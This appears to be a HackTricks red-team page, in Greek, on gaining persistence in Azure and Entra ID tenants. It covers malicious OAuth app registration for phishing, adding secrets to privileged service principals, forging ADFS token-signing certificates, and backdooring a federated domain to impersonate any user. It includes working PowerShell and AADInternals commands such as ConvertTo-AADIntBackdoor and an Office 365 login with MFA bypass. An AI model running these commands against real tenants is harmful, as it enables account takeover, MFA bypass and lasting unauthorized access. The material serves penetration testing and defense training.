# Az - Persistence

{{#include ../../../banners/hacktricks-training.md}}

### OAuth Application

Από προεπιλογή, οποιοσδήποτε χρήστης μπορεί να εγγραφεί μια εφαρμογή στο Entra ID. Έτσι, μπορείτε να εγγραφείτε μια εφαρμογή (μόνο για τον στοχευμένο ενοικιαστή) που χρειάζεται υψηλές άδειες με τη συγκατάθεση του διαχειριστή (και να την εγκρίνετε αν είστε ο διαχειριστής) - όπως η αποστολή email εκ μέρους ενός χρήστη, η διαχείριση ρόλων κ.λπ. Αυτό θα μας επιτρέψει να **εκτελέσουμε επιθέσεις phishing** που θα ήταν πολύ **αποδοτικές** σε περίπτωση επιτυχίας.

Επιπλέον, θα μπορούσατε επίσης να αποδεχθείτε αυτή την εφαρμογή με τον χρήστη σας ως έναν τρόπο για να διατηρήσετε την πρόσβαση σε αυτήν.

### Applications and Service Principals

Με προνόμια Διαχειριστή Εφαρμογών, GA ή έναν προσαρμοσμένο ρόλο με άδειες microsoft.directory/applications/credentials/update, μπορούμε να προσθέσουμε διαπιστευτήρια (μυστικό ή πιστοποιητικό) σε μια υπάρχουσα εφαρμογή.

Είναι δυνατόν να **στοχεύσουμε μια εφαρμογή με υψηλές άδειες** ή **να προσθέσουμε μια νέα εφαρμογή** με υψηλές άδειες.

Ένας ενδιαφέρον ρόλος για να προστεθεί στην εφαρμογή θα ήταν ο **ρόλος διαχειριστή προνομιακής πιστοποίησης** καθώς επιτρέπει να **επαναφέρετε τον κωδικό πρόσβασης** των Παγκόσμιων Διαχειριστών.

Αυτή η τεχνική επιτρέπει επίσης να **παρακαμφθεί το MFA**.
```bash
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
- Για την αυθεντικοποίηση με βάση το πιστοποιητικό
```bash
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
### Federation - Token Signing Certificate

Με **δικαιώματα DA** σε on-prem AD, είναι δυνατό να δημιουργήσουμε και να εισάγουμε **νέα πιστοποιητικά υπογραφής Token** και **πιστοποιητικά αποκρυπτογράφησης Token** που έχουν πολύ μεγάλη διάρκεια ισχύος. Αυτό θα μας επιτρέψει να **συνδεθούμε ως οποιοσδήποτε χρήστης** του οποίου το ImuutableID γνωρίζουμε.

**Εκτελέστε** την παρακάτω εντολή ως **DA στον ADFS server(s)** για να δημιουργήσετε νέα πιστοποιητικά (προεπιλεγμένος κωδικός 'AADInternals'), να τα προσθέσετε στο ADFS, να απενεργοποιήσετε την αυτόματη ανανέωση και να επανεκκινήσετε την υπηρεσία:
```bash
New-AADIntADFSSelfSignedCertificates
```
Στη συνέχεια, ενημερώστε τις πληροφορίες πιστοποίησης με το Azure AD:
```bash
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federation - Trusted Domain

Με δικαιώματα GA σε έναν ενοικιαστή, είναι δυνατόν να **προσθέσετε ένα νέο τομέα** (πρέπει να επαληθευτεί), να ρυθμίσετε τον τύπο αυθεντικοποίησής του σε Federated και να ρυθμίσετε τον τομέα να **εμπιστεύεται ένα συγκεκριμένο πιστοποιητικό** (any.sts στην παρακάτω εντολή) και εκδότη:
```bash
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Αναφορές

- [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{{#include ../../../banners/hacktricks-training.md}}
